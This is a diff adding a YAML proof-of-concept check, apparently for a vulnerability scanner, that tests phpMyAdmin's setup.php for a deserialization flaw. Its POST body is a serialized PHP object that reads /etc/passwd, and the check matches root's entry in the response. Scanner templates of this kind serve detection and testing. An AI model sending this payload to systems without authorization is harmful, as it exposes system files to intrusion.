@@ -1,0 +1,13 @@
+name: poc-yaml-phpmyadmin-setup-deserialization
+rules:
+  - method: POST
+    path: /scripts/setup.php
+    body: >-
+      action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
+    follow_redirects: false
+    expression: >-
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: p0wd3r
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433
